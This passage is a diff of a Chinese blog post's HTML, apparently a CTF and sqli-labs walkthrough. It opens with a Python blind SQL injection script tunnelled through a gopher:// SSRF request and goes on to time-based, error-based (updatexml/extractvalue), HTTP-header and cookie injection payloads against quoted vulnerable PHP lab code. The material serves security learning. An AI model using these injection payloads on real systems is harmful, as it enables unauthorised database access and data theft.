class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure>
 
 <p>当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭</p>
 <p>（感谢LinTu提供的思路）</p>
-<p><img src="/2023/02/09/SQLI/image-20230412130046708.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412130046708.png"></p>
 <p>浏览器发送一次请求，bp抓包。记住python出payload的时候要url编码两次，传到Intruder。</p>
-<p><img src="/2023/02/09/SQLI/image-20230412130722783.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/SQLI/image-20230412130832052.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/SQLI/image-20230412130852364.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412130722783.png"></p>
+<p><img src="/2023/02/09/SQLI/image-20230412130832052.png"></p>
+<p><img src="/2023/02/09/SQLI/image-20230412130852364.png"></p>
 <p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p>
-<p><img src="/2023/02/09/SQLI/image-20230412130941926.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412130941926.png"></p>
 <p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p>
 <hr>
 <h2 id="2023ROIS夏令营"><a href="#2023ROIS夏令营" class="headerlink" title="2023ROIS夏令营"></a>2023ROIS夏令营</h2><h3 id="sqli靶场"><a href="#sqli靶场" class="headerlink" title="sqli靶场"></a>sqli靶场</h3><p>先试单双引号，有报错说明原结构被破坏，则为该引号闭合，都没反应，可能是数字型。再加注释符(–、–+、#都有可能，注意浏览器中从表单提交可能被url编码，可以从hackbar或者bp提交表单)，如果还是报错，则可能存在括号闭合，加括号报错消失之后试下两个语句，<code>or 1=1，or 1=0</code>以及<code>order by ...</code>后者查列数，前者如果结果有所不同则存在布尔注入利用，之后可尝试联合注入、布尔盲注，如果页面始终都没发生变化，则试下时间注入。不存在报错将所有可能情况都试下(<code>&#39; or 1=1/0#</code>、<code>&quot; or 1=1/0#</code>、<code>&quot;) or 1=1/0#</code>、<code>&#39;) or 1=1/0#</code>、<code>&#39;)) or 1=1/0#</code>、<code>&quot;)) or 1=1/0#</code>、)</p>
 <p>常见闭合：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 、">&#x27;、 &quot;、&#x27;)、&quot;)、&#x27;))、&quot;))<br></code></pre></td></tr></table></figure>
 
-<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>发现不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用。布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if()</code>函数和<code>sleep()</code>函数。<code>if(a,sleep(10),1)</code>如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。<br><img src="/2023/02/09/SQLI/image-20230715155500241.png" srcset="/img/loading.gif" lazyload>(%3C和%3E是<code>&lt;&gt;</code>，被编码了hhh)<img src="/2023/02/09/SQLI/image-20230715155607903.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><p>发现不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用。布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if()</code>函数和<code>sleep()</code>函数。<code>if(a,sleep(10),1)</code>如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。<br><img src="/2023/02/09/SQLI/image-20230715155500241.png">(%3C和%3E是<code>&lt;&gt;</code>，被编码了hhh)<img src="/2023/02/09/SQLI/image-20230715155607903.png"></p>
 <p>可以看到如果判断长度不为8，刷的一下就加载完了，但是如果数据库名长度等于八就延迟十秒</p>
 <p>后面的操作就类似了</p>
 <p>在利用python编写脚本的时候要利用到time模块：</p>
@@ -655,21 +266,21 @@
 <h4 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h4><p>报错注入：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mysql">updatexml(target_xml,xpath_string,new_value)<br>#target_xml:需要更新的xml数据，可以是xml类型的列或变量<br>#xpath_string:xpath表达式，用于指定要更新的节点或属性<br>#new_value:新的值， 用于替换目标节点或属性的值<br>#示例：<br>update your_table set xml_culumn = updatexml(xml_column,&#x27;/root/user[1]/name&#x27;,&#x27;Potatowo&#x27;) where id = 1;<br>#上述示例中your_table是要更新的表，xml_column是包含xml数据的列名,/root/user[1]/name是xpath表达式，指定要更新的节点路径，&#x27;Potatowo&#x27;是设置的新的值<br><br>extractvalue(xml_data,xpath_string)<br>#xml_data：xml数据，可以是xml类型的列或变量<br>#xpath_string:xpath表达式，用于指定要提取的节点<br>#函数根据提供的xpath表达式在xml数据中查找匹配的节点，并返回该节点的文本值<br><br>#一个有效的xpath表达式应该满足以下要求：<br>#以节点测试、函数、运算符或路径表达式开头<br>#路径表达式应以节点轴或节点名称开始<br><br>#若不满足xpath语法，则会报错，如果xpath为sql语句，mysql会执行，并将执行结果返回在报错中<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230716210307686.png" srcset="/img/loading.gif" lazyload></p>
-<p>测试注入点的时候发现无论如何都没有反应，都只出现上图的情况，当用户名为’admin’或’Dumb’时密码输入什么都行，懵逼了挺久的，然后看了眼这个<img src="/2023/02/09/SQLI/image-20230716210541431.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230716210307686.png"></p>
+<p>测试注入点的时候发现无论如何都没有反应，都只出现上图的情况，当用户名为’admin’或’Dumb’时密码输入什么都行，懵逼了挺久的，然后看了眼这个<img src="/2023/02/09/SQLI/image-20230716210541431.png"></p>
 <p>啊原来是修改密码啊。。。真tm</p>
 <p>既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合，随手试了下，</p>
-<p><img src="/2023/02/09/SQLI/image-20230716211039043.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230716211039043.png"></p>
 <p>，当然此处的用户名必须是admin或者Dumb，到最后一步查表内容时出问题了</p>
-<p><img src="/2023/02/09/SQLI/image-20230716211543520.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230716211543520.png"></p>
 <p>看了眼大佬博客了解到mysql修改和查询不能是同一张表，因此可以引入一个临时表(详情去看<a target="_blank" rel="noopener" href="https://potatowo233.github.io/2023/07/09/ROIS-Summer/">另一篇博客</a>)，然后又踩坑(不过还好，报错的意思就是说临时表必须起别名，问题不大</p>
-<p><img src="/2023/02/09/SQLI/image-20230716212625454.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230716212625454.png"></p>
 <p>一开始还在纳闷怎么没有admin，观察后发现好像输出字数被限制了，如果想尽可能完整获取数据库中的信息，可以用<code>not in</code>运算符把以及显示出来的用户名排除掉</p>
-<p><img src="/2023/02/09/SQLI/image-20230716213520875.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230716213520875.png"></p>
 <p>如下，查出来的满满都是admin（，看来懵逼时瞎尝试的次数不少（</p>
-<p><img src="/2023/02/09/SQLI/image-20230716214135001.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230716214135001.png"></p>
 <p>换成updatexml()函数试下，注意新加入的’*****‘参数</p>
-<p><img src="/2023/02/09/SQLI/image-20230716214432222.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230716214432222.png"></p>
 <p><strong>想了一下，之前能够回显错误信息的不是都可以用报错注入吗？(脑袋发光)，好像比盲注效率高了不少</strong></p>
 <p>这道题看大佬博客好像都审计了一眼源代码，于是跟着学习了下，</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">	</span>&#123;<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>))<br>		&#123;<br>		<span class="hljs-comment">// truncation (see comments)</span><br>		<span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$value</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>		&#125;<br><br>		<span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())<br>			&#123;<br>			<span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$value</span>);<br>			&#125;<br><br>		<span class="hljs-comment">// Quote if not a number</span><br>		<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_digit</span>(<span class="hljs-variable">$value</span>))<br>			&#123;<br>			<span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;&#x27;&quot;</span> . <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>			&#125;<br>		<br>	<span class="hljs-keyword">else</span><br>		&#123;<br>		<span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$value</span>);<br>		&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
@@ -680,39 +291,39 @@
 <h4 id="HTTP头注入："><a href="#HTTP头注入：" class="headerlink" title="HTTP头注入："></a>HTTP头注入：</h4><p>看一眼源代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;<br>	<span class="hljs-variable">$result1</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>	<span class="hljs-variable">$row1</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result1</span>);<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$row1</span>)<br>			&#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;<br>			<span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br>			<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$insert</span>);<br>			<span class="hljs-comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span><br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>			<span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span><br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;			<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your User Agent is: &#x27;</span> .<span class="hljs-variable">$uagent</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>			<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());			<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>			<br>			&#125;<br>		<span class="hljs-keyword">else</span><br>			&#123;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;<br>			<span class="hljs-comment">//echo &quot;Try again looser&quot;;</span><br>			<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysql_error</span>());<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;			<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>			&#125;<br></code></pre></td></tr></table></figure>
 
-<p>一开始的页面，随便输一个显示本机IP，从源代码可以看出得先登陆成功才会显示uagent，就试admin，源代码不含闭合，是数字型的，试了下<code>admin or 1=1--+</code>不行，试密码吧，试来试去最后居然还是最后忘记填密码了登陆成功的。。。密码为空。。。<img src="/2023/02/09/SQLI/image-20230717133037707.png" srcset="/img/loading.gif" lazyload></p>
+<p>一开始的页面，随便输一个显示本机IP，从源代码可以看出得先登陆成功才会显示uagent，就试admin，源代码不含闭合，是数字型的，试了下<code>admin or 1=1--+</code>不行，试密码吧，试来试去最后居然还是最后忘记填密码了登陆成功的。。。密码为空。。。<img src="/2023/02/09/SQLI/image-20230717133037707.png"></p>
 <p>成功显示出uagent，看到代码这一行：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br></code></pre></td></tr></table></figure>
 
 <p>和上一题一样，uagent单引号闭合，没有查询语句，可以试试报错注入，因为IP变量不可控(不可按预期方法控制)，uname这里不是admin就没法登录也就没法显示uagent，指向很明确了，user agent就是注入点，单引号闭合，</p>
-<p><img src="/2023/02/09/SQLI/image-20230717133503945.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717133503945.png"></p>
 <p>成功报错，注意到原来语句的VALUE存在左括号，因此注入时要额外增加一个右括号保证语句的完整。</p>
-<p><img src="/2023/02/09/SQLI/image-20230717133920520.png" srcset="/img/loading.gif" lazyload></p>
-<p>或者加<code>and &#39;</code><img src="/2023/02/09/SQLI/image-20230717134050816.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717133920520.png"></p>
+<p>或者加<code>and &#39;</code><img src="/2023/02/09/SQLI/image-20230717134050816.png"></p>
 <p>确实没密码。。。</p>
-<p><img src="/2023/02/09/SQLI/image-20230717134452778.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717134452778.png"></p>
 <p>level19和level18差不多，只是注入点从uagent变成了referer</p>
-<p><img src="/2023/02/09/SQLI/image-20230717140539335.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717140539335.png"></p>
 <h4 id="level20"><a href="#level20" class="headerlink" title="level20:"></a>level20:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>			&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>			&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>	&#123;<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;	<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  	<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  	&#125;<br></code></pre></td></tr></table></figure>
 
 <p>单引号闭合username&#x3D;cookie，因此只需要对cookie进行闭合后注入恶意语句即可</p>
-<p><img src="/2023/02/09/SQLI/image-20230717144828460.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717144828460.png"></p>
 <h4 id="level21"><a href="#level21" class="headerlink" title="level21:"></a>level21:</h4><p>和上一题基本没差，就是在cookie上多了个base64编码过程，然后查询语句闭合方式变为<code>&#39;)</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cookee</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>			&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>			&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>	&#123;<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;	<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  	<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  	&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230717150449907.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/SQLI/image-20230717150514301.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717150449907.png"></p>
+<p><img src="/2023/02/09/SQLI/image-20230717150514301.png"></p>
 <h4 id="level22："><a href="#level22：" class="headerlink" title="level22："></a>level22：</h4><p>同上题，改成双引号闭合罢了</p>
 <p>level23：</p>
 <p>单引号输进去报错，但是加注释报错仍然存在，看了眼源代码，注释被过滤掉了</p>
-<p><img src="/2023/02/09/SQLI/image-20230717154027281.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230717154027281.png"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><br><span class="hljs-comment">//filter the comments out so as to comments should not work</span><br><span class="hljs-variable">$reg</span> = <span class="hljs-string">&quot;/#/&quot;</span>;<br><span class="hljs-variable">$reg1</span> = <span class="hljs-string">&quot;/--/&quot;</span>;<br><span class="hljs-variable">$replace</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);<br></code></pre></td></tr></table></figure>
 
 <p>emmm，当时的万能密码怎么说来着，<code>1&#39; or &#39;1&#39;=&#39;1</code>那会没去仔细深究为啥长这样，突然就明白了()，当存在注释符过滤时最后的’1会和原sql语句的引号闭合，保证sql语句的完整性</p>
